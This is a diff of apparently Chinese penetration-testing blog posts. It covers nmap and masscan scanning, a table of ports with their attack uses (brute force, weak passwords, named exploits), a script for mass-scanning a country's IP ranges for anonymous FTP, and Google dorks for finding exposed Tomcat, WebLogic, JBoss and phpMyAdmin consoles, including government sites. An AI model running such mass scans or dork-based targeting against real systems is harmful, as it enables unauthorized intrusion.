+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">几种常用的扫描方式,tcp的syn和ack扫描另外还有connect(推荐用这个)</div><div class="line"><span class="comment"># nmap -sT 192.168.3.240  个人推荐的扫描方式</span></div><div class="line"><span class="comment"># nmap -sS 192.168.3.240</span></div><div class="line"><span class="comment"># nmap -sA 192.168.3.240</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">内网arp扫描,探测内网存活主机还是非常不错的,可轻易bypass掉各种应用层防火墙,个人比较推荐的选项 -sn 禁用端口扫描</div><div class="line"><span class="comment"># nmap -sn -PR 192.168.3.0/24</span></div></pre></td></tr></table></figure>
+<p>7,如何快速对目标网站的一些基本情况做出判断,如,对方用的什么web服务器,后端脚本是什么,数据库什么型号版本,系统平台是什么等……,下面就来简单熟悉一些常见的web架构:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">asp  + access + iis6.<span class="number">0</span> + <span class="number">2003</span></div><div class="line">aspx + mssql2005/mssql2008 + iis7.<span class="number">0</span> + <span class="number">2008</span></div><div class="line">php[<span class="number">5.2</span>,<span class="number">5.4</span>,<span class="number">5.6</span>]  + mysql[<span class="number">5.1</span>,<span class="number">5.5</span>]/postgresql + apache[<span class="number">2.2</span>,<span class="number">2.4</span>] + linux/windows</div><div class="line">php + mysql + ngnix + linux</div><div class="line">jsp  + oracle + tomcat + linux/windows</div><div class="line">java + mssql  + tomcat + linux/windows</div><div class="line">……</div></pre></td></tr></table></figure></p>
+<p>利用httprint 识别web目标服务器指纹[其实很鸡肋的一个小工具,一般看下响应头就有了]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># httprint -h 144.214.20.118 -s ./Desktop/signature.txt</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">web服务器指纹字典下载地址:</div><div class="line"><span class="symbol">http:</span>/<span class="regexp">/www.net-square.com/signature</span>.txt</div></pre></td></tr></table></figure>
+<p>常用的几个相对比较实用的firefox插件,自己在配置渗透环境的时候最好预先装上:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">hackbar</div><div class="line">tamper data</div><div class="line">live http headers</div><div class="line">firebug</div><div class="line">downthemall</div></pre></td></tr></table></figure></p>
+<p>使用whatweb[探测到的信息相对比较全面],返回的结果中大致包括以下内容:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">请求返回的状态码</div><div class="line">web服务器版本</div><div class="line">ip所在国家</div><div class="line">操作系统详细的版本信息</div><div class="line">脚本语言版本信息</div><div class="line">域名解析到的ip</div><div class="line">截取并显示网站标题</div><div class="line">等等……</div></pre></td></tr></table></figure></p>
+<p>如何快速判断目标使用的系统平台:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>,在url中尝试变化大小写,进行请求,观察页面响应,windows默认对大小写不敏感,linux则严格区分大小写,所以返回的页面肯定是不一样的</div><div class="line"><span class="number">2</span>,观察各种报错信息,看看里面有没有泄露服务器的相关信息</div><div class="line"><span class="number">3</span>,等等……</div></pre></td></tr></table></figure></p>
+<p>8,一些常见端口渗透用途汇总:</p>
+<table>
+<thead>
+<tr>
+<th>端口号</th>
+<th style="text-align:center">端口服务/协议简要说明</th>
+<th style="text-align:center">关于端口可能的一些渗透用途</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>tcp 20,21</td>
+<td style="text-align:center">ftp 默认的数据和命令传输端口[可明文亦可加密传输]</td>
+<td style="text-align:center">允许匿名的上传下载,爆破,嗅探,win提权,远程执行(proftpd 1.3.5),各类后门(proftpd,vsftp 2.3.4)</td>
+</tr>
+<tr>
+<td>tcp 22</td>
+<td style="text-align:center">ssh[数据ssl加密传输]</td>
+<td style="text-align:center">可根据已有信息尝试爆破,v1版本可中间人,ssh隧道及内网代理转发,文件传输,等等…常用于linux远程管理…</td>
+</tr>
+<tr>
+<td>tcp 23</td>
+<td style="text-align:center">telnet[明文传输]</td>
+<td style="text-align:center">爆破,嗅探,一般常用于路由,交换登陆,可尝试弱口令,也许会有意想不到的收获</td>
+</tr>
+<tr>
+<td>tcp 25</td>
+<td style="text-align:center">smtp[简单邮件传输协议,多数linux发行版可能会默认开启此服务]</td>
+<td style="text-align:center">邮件伪造,vrfy/expn 查询邮件用户信息,可使用smtp-user-enum工具来自动跑</td>
+</tr>
+<tr>
+<td>tcp/udp 53</td>
+<td style="text-align:center">dns[域名解析]</td>
+<td style="text-align:center">允许区域传送,dns劫持,缓存投毒,欺骗以及各种基于dns隧道的远控</td>
+</tr>
+<tr>
+<td>tcp/udp 69</td>
+<td style="text-align:center">tftp[简单文件传输协议,无认证]</td>
+<td style="text-align:center">尝试下载目标及其的各类重要配置文件</td>
+</tr>
+<tr>
+<td>tcp 80-89,443,8440-8450,8080-8089</td>
+<td style="text-align:center">web[各种常用的web服务端口]</td>
+<td style="text-align:center">各种常用web服务端口,可尝试经典的top10,vpn,owa,webmail,目标oa,各类java控制台,各类服务器web管理面板,各类web中间件漏洞利用,各类web框架漏洞利用等等……</td>
+</tr>
+<tr>
+<td>tcp 110</td>
+<td style="text-align:center">[邮局协议,可明文可密文]</td>
+<td style="text-align:center">可尝试爆破,嗅探</td>
+</tr>
+<tr>
+<td>tcp 137,139,445</td>
+<td style="text-align:center">samba[smb实现windows和linux间文件共享,明文]</td>
+<td style="text-align:center">可尝试爆破以及smb自身的各种远程执行类漏洞利用,如,ms08-067,ms17-010,嗅探等……</td>
+</tr>
+<tr>
+<td>tcp 143</td>
+<td style="text-align:center">imap[可明文可密文]</td>
+<td style="text-align:center">可尝试爆破</td>
+</tr>
+<tr>
+<td>udp 161</td>
+<td style="text-align:center">snmp[明文]</td>
+<td style="text-align:center">爆破默认团队字符串,搜集目标内网信息</td>
+</tr>
+<tr>
+<td>tcp 389</td>
+<td style="text-align:center">ldap[轻量级目录访问协议]</td>
+<td style="text-align:center">ldap注入,允许匿名访问,弱口令</td>
+</tr>
+<tr>
+<td>tcp 512,513,514</td>
+<td style="text-align:center">linux rexec</td>
+<td style="text-align:center">可爆破,rlogin登陆</td>
+</tr>
+<tr>
+<td>tcp 873</td>
+<td style="text-align:center">rsync备份服务</td>
+<td style="text-align:center">匿名访问,文件上传</td>
+</tr>
+<tr>
+<td>tcp 1194</td>
+<td style="text-align:center">openvpn</td>
+<td style="text-align:center">想办法钓vpn账号,进内网</td>
+</tr>
+<tr>
+<td>tcp 1352</td>
+<td style="text-align:center">Lotus domino邮件服务</td>
+<td style="text-align:center">弱口令,信息泄漏,爆破</td>
+</tr>
+<tr>
+<td>tcp 1433</td>
+<td style="text-align:center">mssql数据库</td>
+<td style="text-align:center">注入,提权,sa弱口令,爆破</td>
+</tr>
+<tr>
+<td>tcp 1521</td>
+<td style="text-align:center">oracle数据库</td>
+<td style="text-align:center">tns爆破,注入,弹shell…</td>
+</tr>
+<tr>
+<td>tcp 1500</td>
+<td style="text-align:center">ispmanager    主机控制面板</td>
+<td style="text-align:center">弱口令</td>
+</tr>
+<tr>
+<td>tcp 1025,111,2049</td>
+<td style="text-align:center">nfs</td>
+<td style="text-align:center">权限配置不当</td>
+</tr>
+<tr>
+<td>tcp 1723</td>
+<td style="text-align:center">pptp</td>
+<td style="text-align:center">爆破,想办法钓vpn账号,进内网</td>
+</tr>
+<tr>
+<td>tcp 2082,2083</td>
+<td style="text-align:center">cpanel主机管理面板登录</td>
+<td style="text-align:center">弱口令</td>
+</tr>
+<tr>
+<td>tcp 2181</td>
+<td style="text-align:center">zookeeper</td>
+<td style="text-align:center">未授权访问</td>
+</tr>
+<tr>
+<td>tcp 2601,2604</td>
+<td style="text-align:center">zebra路由</td>
+<td style="text-align:center">默认密码zerbra</td>
+</tr>
+<tr>
+<td>tcp 3128</td>
+<td style="text-align:center">squid代理服务</td>
+<td style="text-align:center">弱口令</td>
+</tr>
+<tr>
+<td>tcp 3312,3311</td>
+<td style="text-align:center">kangle主机管理登录</td>
+<td style="text-align:center">弱口令</td>
+</tr>
+<tr>
+<td>tcp 3306</td>
+<td style="text-align:center">mysql数据库</td>
+<td style="text-align:center">注入,提权,爆破</td>
+</tr>
+<tr>
+<td>tcp 3389</td>
+<td style="text-align:center">windows rdp远程桌面</td>
+<td style="text-align:center">shift后门[需要03以下的系统],爆破,ms12-020[蓝屏exp]</td>
+</tr>
+<tr>
+<td>tcp 4848</td>
+<td style="text-align:center">glassfish控制台</td>
+<td style="text-align:center">弱口令</td>
+</tr>
+<tr>
+<td>tcp 4899</td>
+<td style="text-align:center">radmin远程桌面管理工具,现在已经非常非常少了</td>
+<td style="text-align:center">抓密码拓展机器</td>
+</tr>
+<tr>
+<td>tcp 5000</td>
+<td style="text-align:center">sybase/DB2数据库</td>
+<td style="text-align:center">爆破,注入</td>
+</tr>
+<tr>
+<td>tcp 5432</td>
+<td style="text-align:center">postgresql数据库</td>
+<td style="text-align:center">爆破,注入,弱口令</td>
+</tr>
+<tr>
+<td>tcp 5632</td>
+<td style="text-align:center">pcanywhere远程桌面管理工具</td>
+<td style="text-align:center">抓密码,代码执行,已经快退出历史舞台了</td>
+</tr>
+<tr>
+<td>tcp 5900,5901,5902</td>
+<td style="text-align:center">vnc远程桌面管理工具</td>
+<td style="text-align:center">弱口令爆破,如果信息搜集不到位,几率很小</td>
+</tr>
+<tr>
+<td>tcp 5984</td>
+<td style="text-align:center">CouchDB</td>
+<td style="text-align:center">未授权导致的任意指令执行</td>
+</tr>
+<tr>
+<td>tcp 6379</td>
+<td style="text-align:center">redis未授权</td>
+<td style="text-align:center">可尝试未授权访问,弱口令爆破</td>
+</tr>
+<tr>
+<td>tcp 7001,7002</td>
+<td style="text-align:center">weblogic控制台</td>
+<td style="text-align:center">java反序列化,弱口令</td>
+</tr>
+<tr>
+<td>tcp 7778</td>
+<td style="text-align:center">kloxo</td>
+<td style="text-align:center">主机面板登录</td>
+</tr>
+<tr>
+<td>tcp 8000</td>
+<td style="text-align:center">Ajenti主机控制面板</td>
+<td style="text-align:center">弱口令</td>
+</tr>
+<tr>
+<td>tcp 8443</td>
+<td style="text-align:center">plesk主机控制面板</td>
+<td style="text-align:center">弱口令</td>
+</tr>
+<tr>
+<td>tcp 8069</td>
+<td style="text-align:center">zabbix</td>
+<td style="text-align:center">远程执行,sql注入</td>
+</tr>
+<tr>
+<td>tcp 8080-8089</td>
+<td style="text-align:center">Jenkins,jboss</td>
+<td style="text-align:center">反序列化,控制台弱口令</td>
+</tr>
+<tr>
+<td>tcp 9080-9081,9090</td>
+<td style="text-align:center">websphere控制台</td>
+<td style="text-align:center">java反序列化/弱口令</td>
+</tr>
+<tr>
+<td>tcp 9200,9300</td>
+<td style="text-align:center">elasticsearch</td>
+<td style="text-align:center">远程执行</td>
+</tr>
+<tr>
+<td>tcp 10000</td>
+<td style="text-align:center">webmin linux主机web控制面板入口</td>
+<td style="text-align:center">弱口令</td>
+</tr>
+<tr>
+<td>tcp 11211</td>
+<td style="text-align:center">memcacache</td>
+<td style="text-align:center">未授权访问</td>
+</tr>
+<tr>
+<td>tcp 27017,27018</td>
+<td style="text-align:center">mongodb</td>
+<td style="text-align:center">爆破,未授权访问</td>
+</tr>
+<tr>
+<td>tcp 3690</td>
+<td style="text-align:center">svn服务</td>
+<td style="text-align:center">svn泄露,未授权访问</td>
+</tr>
+<tr>
+<td>tcp 50000</td>
+<td style="text-align:center">SAP Management Console</td>
+<td style="text-align:center">远程执行</td>
+</tr>
+<tr>
+<td>tcp 50070,50030</td>
+<td style="text-align:center">hadoop</td>
+<td style="text-align:center">默认端口未授权访问</td>
+</tr>
+</tbody>
+</table>
+<p><br></p>
+<p>9,说了这么多,想必大家应该很清楚这些端口具体该怎么利用了</p>
+<p>10,最后,在介绍个小脚本,whatportis 专门用来查询某个端口的具体作用</p>
+<p>11,如果你有兴趣,想对某个国家网段进行大规模扫描也可以把它写成这样,当然,我这里是随便写的,你要想实际用,可能还要好好把它完善一下<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span>!/bin/bash</div><div class="line">while read LINE</div><div class="line">do</div><div class="line">   masscan -p 21 --rate=100 $LINE | tee -a 21.txt</div><div class="line">done &lt; hk_ip.txt</div></pre></td></tr></table></figure></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># tail -f 21.txt</span></div><div class="line"><span class="comment"># awk &#123;'print $6'&#125; 21.txt &gt;&gt; result.txt</span></div><div class="line"><span class="comment"># nmap -p 21 -iL result.txt  -oN ftp_anonymous.txt  -v --script ftp-anon.nse</span></div></pre></td></tr></table></figure>
+<p><br></p>
+<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于端口渗透,如果不是你自己写工具的情况下,其实本身并没多少技术含量,工具总体使用上还是比较简单的[对于无状态扫描的具体内部实现还是比较复杂的,至今为止,我自己也有很多东西都没整明白],这个东西怎么说呢,很多是运气和经验的成分在里面,可能还要外加一个高质量的字典,另外,再多说一句,在没有十足的把握的情况下,直接在公网爆破是不太靠谱的,实际测试中,对一些稍有防护的目标,爆破的成率还是蛮低的[虽然低,但往往非常有效,走投无路不妨尝试],当然啦,对于端口,爆破只是一个很小的方面,比如,当我们发现某个工具或者系统服务存在远程溢出或者代码执行[肯定不仅限于此类的可远程利用的漏洞],就可以通过这种方式大规模的批量实施端口入侵,这也许才是它真正的价值所在,可能还有很多其它的小工具,脚本这里都没提到,不过那些都不太重要,对于公网扫描,有这些,足矣,至于那些,后期到内网中我们再具体说不迟,祝大家好运!<br><br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2014/12/18/inside-method/">
                 web渗透第一步之信息搜集  [ 找目标内网入口 ]
             </a>
@@ -350,204 +777,6 @@
 
 </div>
             
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2014/12/14/search-hacking/">
-                熟练利用google hacking 辅助我们快速渗透 [ 通常针对大中型目标 ]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2014-12-14</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/google-hacking/">google hacking</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br></p>
-<h5 id="关于google-hacking的几个基础过滤器-务必谨记-过滤器是死的-人是活的-把脑洞放开-极尽所能的想着法拼装-往往能达到超预期的效果"><a href="#关于google-hacking的几个基础过滤器-务必谨记-过滤器是死的-人是活的-把脑洞放开-极尽所能的想着法拼装-往往能达到超预期的效果" class="headerlink" title="关于google hacking的几个基础过滤器[务必谨记,过滤器是死的,人是活的,把脑洞放开,极尽所能的想着法拼装,往往能达到超预期的效果]:"></a>关于google hacking的几个基础过滤器[务必谨记,过滤器是死的,人是活的,把脑洞放开,极尽所能的想着法拼装,往往能达到超预期的效果]:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">intitle:</span>     从网页标题中搜索指定的关键字,可专门用来搜索指定版本名称的各类web程序,也可用allintitle</div><div class="line"><span class="symbol">inurl:</span> 		从url中搜索指定的关键字,可专门用来构造各种形式的漏洞url,也可用allinurl</div><div class="line"><span class="symbol">intext:</span> 	从网页中搜索指定的关键字,可专门用它来穿透到漏洞页面……也可用allintext</div><div class="line"><span class="symbol">filetype:</span>    搜索指定的文件后缀,例如<span class="symbol">:sql</span> mdb txt bak backup ini zip rar doc xls…… </div><div class="line"><span class="symbol">site:</span>        在某个特定的网站内中搜索指定的内容</div><div class="line"><span class="symbol">link:</span>        搜索和该链接有关联连接,比如<span class="symbol">:</span>友情链接</div><div class="line">index <span class="symbol">of:</span>    找目录遍历会用到</div></pre></td></tr></table></figure>
-<h5 id="google所支持的一些通配符-建议选择性的用-因为越精确-就意味着结果越少-这样我们容易漏掉一些目标-毕竟不是正则-我们的最终目的还是希望能尽快找到有漏洞的站先进去再说"><a href="#google所支持的一些通配符-建议选择性的用-因为越精确-就意味着结果越少-这样我们容易漏掉一些目标-毕竟不是正则-我们的最终目的还是希望能尽快找到有漏洞的站先进去再说" class="headerlink" title="google所支持的一些通配符(建议选择性的用,因为越精确,就意味着结果越少,这样我们容易漏掉一些目标,毕竟不是正则,我们的最终目的还是希望能尽快找到有漏洞的站先进去再说):"></a>google所支持的一些通配符(建议选择性的用,因为越精确,就意味着结果越少,这样我们容易漏掉一些目标,毕竟不是正则,我们的最终目的还是希望能尽快找到有漏洞的站先进去再说):</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+   强制包含某个字符进行查询</div><div class="line">-   查询的时候忽略某个字符</div><div class="line"><span class="string">""</span>  查询的时候精确匹配双引号内的字符</div><div class="line">.   匹配某单个字符进行查询</div><div class="line">*   匹配任意字符进行查询</div><div class="line"><span class="params">|   或者,多个选择,只要有一个关键字匹配上即可</span></div></pre></td></tr></table></figure>
-<h5 id="找各种web入口-当然-这里所指的web入口并非仅限于各种常规网站后台-说到网站后台-一定要手工多尝试几个路径"><a href="#找各种web入口-当然-这里所指的web入口并非仅限于各种常规网站后台-说到网站后台-一定要手工多尝试几个路径" class="headerlink" title="找各种web入口,当然,这里所指的web入口并非仅限于各种常规网站后台[说到网站后台,一定要手工多尝试几个路径]:"></a>找各种web入口,当然,这里所指的web入口并非仅限于各种常规网站后台[说到网站后台,一定要手工多尝试几个路径]:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">例如<span class="symbol">:</span>一些疑似目标内网的各种web管理系统入口,web端的数据库管理入口,某些设备的web端配置入口,以及一些常见的java控制台入口等等……反正你觉得进去以后能上传脚本的地方全部都可以尝试,东西在你手里,可劲儿用就是了</div></pre></td></tr></table></figure>
-<p><br></p>
-<h5 id="搜集各版本tomcat入口-默认在8080端口上"><a href="#搜集各版本tomcat入口-默认在8080端口上" class="headerlink" title="搜集各版本tomcat入口[默认在8080端口上]:"></a>搜集各版本tomcat入口[默认在8080端口上]:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">intext:</span>$CATALINA_HOME/webapps/ROOT/ <span class="symbol">intitle:</span>apache tomcat 		直接这样搜结果肯定会非常多</div><div class="line"><span class="symbol">intext:</span>$CATALINA_HOME/webapps/ROOT/ <span class="symbol">inurl:</span><span class="number">8080</span>/    			我们可以带指定端口号去搜,因为有些web并非在默认端口上,这样搜的话,可以尽量防止有漏网之鱼</div><div class="line"><span class="symbol">intext:</span>$CATALINA_HOME/webapps/ROOT/ <span class="symbol">intitle:</span>Apache Tomcat/<span class="number">5.5</span>.<span class="number">27</span> <span class="symbol">site:</span>*.hk      针对特定版本特定国家去搜,比如爆出某个版本有远程执行类的漏洞就可以利用这种方式来批量进行</div><div class="line"><span class="symbol">intext:</span>$CATALINA_HOME/webapps/ROOT/ <span class="symbol">intitle:</span>Apache Tomcat/<span class="number">7.0</span>.<span class="number">32</span> <span class="symbol">site:</span>*.gov.br</div><div class="line"><span class="symbol">intext:</span>$CATALINA_HOME/webapps/ROOT/ <span class="symbol">intitle:</span>Apache Tomcat/<span class="number">5.0</span>.<span class="number">12</span> <span class="symbol">site:</span>*.cn</div><div class="line"><span class="symbol">intext:</span>$CATALINA_HOME/webapps/ROOT/ <span class="symbol">intitle:</span>Apache Tomcat/<span class="number">6.0</span>.<span class="number">24</span> <span class="symbol">site:</span>*.com</div><div class="line"><span class="symbol">intext:</span>$CATALINA_HOME/webapps/ROOT/ <span class="symbol">intitle:</span>apache tomcat <span class="symbol">site:</span>*.edu.*</div><div class="line"><span class="symbol">intext:</span>$CATALINA_HOME/webapps/ROOT/ <span class="symbol">intitle:</span>apache tomcat <span class="symbol">site:</span>*.gov.*		搜特定类型的目标站点,如,学校一般都是edu,各种民间组织一般都是org,政府机构一般都是gov……</div><div class="line"><span class="symbol">intext:</span>$CATALINA_HOME/webapps/ROOT/ <span class="symbol">intitle:</span>apache tomcat <span class="symbol">site:</span>*.org.*</div><div class="line"><span class="symbol">intext:</span>$CATALINA_HOME/webapps/ROOT/ <span class="symbol">intitle:</span>Apache Tomcat/<span class="number">7.0</span> <span class="symbol">site:</span>*.org.*</div><div class="line"><span class="symbol">intext:</span>$CATALINA_HOME/webapps/ROOT/ <span class="symbol">intitle:</span>apache tomcat <span class="symbol">site:</span>*.jp</div><div class="line"><span class="symbol">intext:</span>$CATALINA_HOME/webapps/ROOT/ <span class="symbol">intitle:</span>apache tomcat <span class="symbol">site:</span>*.vn</div><div class="line"><span class="symbol">intext:</span>$CATALINA_HOME/webapps/ROOT/ <span class="symbol">intitle:</span>apache tomcat <span class="symbol">site:</span>*.ph</div><div class="line"><span class="symbol">intext:</span>$CATALINA_HOME/webapps/ROOT/ <span class="symbol">intitle:</span>Apache Tomcat <span class="symbol">site:</span>*.uk</div><div class="line"><span class="symbol">intext:</span>$CATALINA_HOME/webapps/ROOT/ <span class="symbol">intitle:</span>apache tomcat <span class="symbol">site:</span>baidu.com	无意发现百度的某个子域,竟然是个博彩站</div><div class="line"><span class="symbol">intext:</span>$CATALINA_HOME/webapps/ROOT/ <span class="symbol">intitle:</span>apache tomcat <span class="symbol">site:</span>org.tw</div></pre></td></tr></table></figure>
-<p><img src="/img/google tomcat.png" alt=""><br></p>
-<h5 id="搜集weblogic入口"><a href="#搜集weblogic入口" class="headerlink" title="搜集weblogic入口:"></a>搜集weblogic入口:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">inurl:</span>/console/login/LoginForm.jsp  	这样范围太大,可根据上面的示例随意变形</div><div class="line"><span class="symbol">inurl:</span>/console/login/LoginForm.jsp <span class="symbol">intitle:</span>Oracle WebLogic Server</div><div class="line"><span class="symbol">inurl:</span>/console/login/ <span class="symbol">intitle:</span><span class="string">"Oracle WebLogic Server 管理控制台"</span></div></pre></td></tr></table></figure>
-<p><img src="/img/google weblogic.png" alt=""><br></p>
-<h5 id="搜集jboss入口"><a href="#搜集jboss入口" class="headerlink" title="搜集jboss入口:"></a>搜集jboss入口:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">inurl:</span>/jmx-console/htmladaptor</div><div class="line"><span class="symbol">inurl:</span>/jmx-console/htmladaptor <span class="symbol">site:</span>*.edu.*</div><div class="line"><span class="symbol">inurl:</span>/jmx-console/htmladaptor <span class="symbol">site:</span>*.org.*</div><div class="line"><span class="symbol">inurl:</span>/jmx-console/htmladaptor <span class="symbol">site:</span>*.tw</div></pre></td></tr></table></figure>
-<p><img src="/img/google jboss.png" alt=""><br></p>
-<h5 id="搜集websphere入口"><a href="#搜集websphere入口" class="headerlink" title="搜集websphere入口:"></a>搜集websphere入口:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">inurl:</span>/ibm/console/logon.jsp</div></pre></td></tr></table></figure>
-<p><img src="/img/google websphere.png" alt=""><br></p>
-<h5 id="搜集phpmyadmin入口"><a href="#搜集phpmyadmin入口" class="headerlink" title="搜集phpmyadmin入口:"></a>搜集phpmyadmin入口:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">inurl:</span>/phpMyAdmin/index.php </div><div class="line"><span class="symbol">inurl:</span>/phpMyAdmin/index.php db+information_schema   	指定命中数据</div><div class="line"><span class="symbol">inurl:</span>/phpMyAdmin/index.php <span class="symbol">intext:</span>phpMyAdmin <span class="number">2.7</span>.<span class="number">0</span> 	直接针对特定版本号去搜索,更加精准</div><div class="line"><span class="symbol">inurl:</span>/phpMyAdmin/index.php <span class="symbol">site:</span>*.tw</div><div class="line"><span class="symbol">inurl:</span>/phpMyAdmin/index.php <span class="symbol">site:</span>*.org</div><div class="line"><span class="symbol">inurl:</span>/phpMyAdmin/index.php <span class="symbol">site:</span>*.hk</div></pre></td></tr></table></figure>
-<p><img src="/img/google phpmyadmin.png" alt=""><br></p>
-<h5 id="批量搜集webmin入口-web版的linux系统管理工具-默认10000端口"><a href="#批量搜集webmin入口-web版的linux系统管理工具-默认10000端口" class="headerlink" title="批量搜集webmin入口[web版的linux系统管理工具,默认10000端口]:"></a>批量搜集webmin入口[web版的linux系统管理工具,默认10000端口]:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">intitle:</span>Login to Webmin <span class="symbol">intext:</span><span class="string">"login to the Webmin server on"</span></div></pre></td></tr></table></figure>
-<p><img src="/img/google webmin.png" alt=""><br></p>
-<h5 id="批量搜wordpress程序-关于wp的特征比较多-大家可自行构造"><a href="#批量搜wordpress程序-关于wp的特征比较多-大家可自行构造" class="headerlink" title="批量搜wordpress程序[关于wp的特征比较多,大家可自行构造]:"></a>批量搜wordpress程序[关于wp的特征比较多,大家可自行构造]:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">inurl:</span>/wp-login.php  <span class="symbol">site:</span>*.hk</div><div class="line">index of /wp-content/uploads <span class="symbol">inurl:</span>/wp-login.php</div><div class="line"><span class="symbol">inurl:</span>/wp-content/themes/theagency    上传漏洞</div></pre></td></tr></table></figure>
-<p><img src="/img/google wp.png" alt=""><br></p>
-<h5 id="批量搜joomla程序"><a href="#批量搜joomla程序" class="headerlink" title="批量搜joomla程序:"></a>批量搜joomla程序:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">inurl:</span>/administrator/index.php</div><div class="line"><span class="symbol">inurl:</span>index.php?option=com_advertisementboard  找注入</div><div class="line"><span class="symbol">inurl:</span>index.php?option=com_carocci</div><div class="line"><span class="symbol">inurl:</span>index.php?option=com_product</div><div class="line"><span class="symbol">inurl:</span>/administrator/index.php <span class="symbol">site:</span>*.hk</div></pre></td></tr></table></figure>
-<p><img src="/img/google joomla.png" alt=""><br></p>
-<h5 id="批量搜drupal程序"><a href="#批量搜drupal程序" class="headerlink" title="批量搜drupal程序:"></a>批量搜drupal程序:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">inurl:</span>CHANGELOG.txt <span class="symbol">intext:</span>drupal <span class="symbol">intext:</span><span class="string">"SA-CORE"</span> -<span class="symbol">site:</span>github.com -<span class="symbol">site:</span>drupal.org</div></pre></td></tr></table></figure>
-<h5 id="批量搜discuz程序"><a href="#批量搜discuz程序" class="headerlink" title="批量搜discuz程序:"></a>批量搜discuz程序:</h5><h5 id="批量搜集opencart程序"><a href="#批量搜集opencart程序" class="headerlink" title="批量搜集opencart程序:"></a>批量搜集opencart程序:</h5><h5 id="批量搜集phpbb程序"><a href="#批量搜集phpbb程序" class="headerlink" title="批量搜集phpbb程序:"></a>批量搜集phpbb程序:</h5><h5 id="当然-你也可以根据下面的一些特征去找特定的开源程序-这种命中率显然没有直接用特征目录的命中率高"><a href="#当然-你也可以根据下面的一些特征去找特定的开源程序-这种命中率显然没有直接用特征目录的命中率高" class="headerlink" title="当然,你也可以根据下面的一些特征去找特定的开源程序[这种命中率显然没有直接用特征目录的命中率高]:"></a>当然,你也可以根据下面的一些特征去找特定的开源程序[这种命中率显然没有直接用特征目录的命中率高]:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">power by wordpress                powered by discuz x3.<span class="number">2</span></div><div 